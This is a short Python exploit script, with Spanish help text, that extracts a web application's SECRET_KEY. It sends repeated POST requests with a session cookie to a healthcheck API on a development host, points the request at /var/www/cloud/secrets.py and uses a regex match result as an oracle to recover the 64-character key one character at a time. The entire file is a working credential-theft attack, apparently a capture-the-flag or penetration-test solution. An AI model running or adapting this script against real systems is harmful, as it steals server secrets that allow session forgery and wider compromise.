
import string
import requests
import argparse
import json


def getSecret(cookie):
    ###asdflanksdfansdlfkas;dfnkafsasflasdfknasf
    chars = string.printable
    cookies = {'session': cookie}

    s = requests.Session()
    pattern = ""
    print("waiting....\n")
    while True:
        
        for c in chars:
            try:
                rsp = s.post('http://dev.thing.edu:8888/api/healthcheck', {
                    'file': '/var/www/cloud/secrets.py',
                    'type': 'custom',
                    'pattern': "^SECRET_KEY = '" + pattern + c + ".*"
                }, cookies=cookies)
                if json.loads(rsp.content)['result']:
                    pattern += c 
                    if len(pattern) == 64:
                        print(f"SECRET_KEY = {pattern}")
                        exit()

                    break
                
            except Exception:
                print(rsp.content)



def main():
    parser = argparse.ArgumentParser(description="herramienta para obtener la SECRET_KEY")
    parser.add_argument('cookie',help="ingrese la cookie de sesión")

    args = parser.parse_args()
    getSecret(args.cookie)

if __name__ == '__main__':
    main()
    
    
#########################
##
##    
